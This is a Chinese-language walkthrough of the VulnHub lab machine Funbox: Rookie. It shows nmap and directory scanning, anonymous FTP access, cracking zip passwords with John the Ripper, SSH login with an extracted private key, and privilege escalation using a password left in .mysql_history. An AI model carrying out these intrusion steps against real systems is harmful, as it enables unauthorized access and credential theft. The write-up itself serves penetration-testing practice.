靶机地址：[Funbox: Rookie ~ VulnHub](https://www.vulnhub.com/entry/funbox-rookie,520/)
推荐：VirtualBox

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.59"
sudo nmap -p "21,22,80" -sV "192.168.1.59"
# 21/tcp open  ftp     ProFTPD 1.3.5e
# 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

访问web服务，是一个apache的默认页面，没什么特别的
web路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.59"
# /robots.txt
```
内容如下
```
Disallow: /logs/
```
再次扫描
```Shell
sudo dirsearch -u "http://192.168.1.59/logs/"
```
啥也没发现，换个字典试试
```Shell
feroxbuster -u http://192.168.1.59 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
也没有别的发现

再看看ftp，匿名登录（anonymous）成功
```Shell
ftp> ls
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
# -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
# -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
# -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
```
下载这些压缩包，发现大小都一样，而且解压需要密码
尝试暴力破解
```Shell
zip2john tom.zip > tom_zip.john
john tom_zip.john --wordlist=/home/kali/Tools/Custom/rockyou.txt
# iubire
zip2john cathrine.zip > cathrine_zip.john
john cathrine_zip.john --wordlist=/home/kali/Tools/Custom/rockyou.txt
# catwoman
```
只破解出这两个密码，其它的都失败了
尝试用这两个SSH
```Shell
ssh tom@192.168.1.59
# iubire
ssh cathrine@192.168.1.59
# catwoman
```
都失败了，先解压出文件看看
```Shell
unzip tom.zip
# iubire
ls -l
# -rw------- 1 kali kali 1675  7月 25  2020 id_rsa
```
尝试通过私钥SSH
```Shell
ssh tom@192.168.1.59 -i id_rsa
```
登录成功了，再试试另一个
```Shell
mv id_rsa tom_id_rsa
unzip cathrine.zip
# catwoman
mv id_rsa cathrine_id_rsa
ssh cathrine@192.168.1.59 -i cathrine_id_rsa
```
失败了，看来能利用的只有 `tom` 这个用户
```Shell
ssh tom@192.168.1.59 -i tom_id_rsa
```
尝试信息收集提权
```Shell
bash -i
ls -a
# .mysql_history .sudo_as_admin_successful 
cat .mysql_history
```
其中包含这样一句SQL
```SQL
insert into support (tom, xx11yy22!);
```
看看这个是不是用户密码，尝试提权
```Shell
sudo -l
# xx11yy22!
# (ALL : ALL) ALL
sudo su
```
提权成功
